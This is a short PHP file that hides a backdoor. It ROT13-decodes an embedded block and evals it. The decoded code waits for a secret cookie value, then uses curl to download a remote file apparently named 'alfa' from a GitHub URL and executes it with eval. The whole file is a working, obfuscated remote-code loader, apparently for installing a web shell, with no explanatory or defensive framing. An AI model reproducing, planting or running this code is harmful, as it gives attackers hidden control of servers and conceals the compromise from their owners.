<?php

function custom_rot13($str) {
    $result = '';
    for ($i = 0, $l = strlen($str); $i < $l; $i++) {
        $c = $str[$i];
        if ($c >= 'a' && $c <= 'z') {
            $result .= chr((ord($c) - 97 + 13) % 26 + 97);
        } elseif ($c >= 'A' && $c <= 'Z') {
            $result .= chr((ord($c) - 65 + 13) % 26 + 65);
        } else {
            $result .= $c;
        }
    }
    return $result;
}

$asd = <<<'ASD'

vs ($_PBBXVR['qhavnznynz'] && $_PBBXVR['qhavnznynz'] == 'qhavnznynz') {
    $hey = 'uggcf://enj.tvguhohfrepbagrag.pbz/BARWNPX/n/ersf/urnqf/znva/nysn';
    
    shapgvba trgHey($hey) {
        $pu = phey_vavg($hey);
        phey_frgbcg($pu, PHEYBCG_ERGHEAGENAFSRE, gehr);
        phey_frgbcg($pu, PHEYBCG_URNQRE, snyfr);
        $erfcbafr = phey_rkrp($pu);
        phey_pybfr($pu);
        erghea $erfcbafr;
    }

    $erfcbafr = trgHey($hey);
    @RiNy('?>'. $erfcbafr);
}
ASD;

@EvAl(custom_rot13($asd));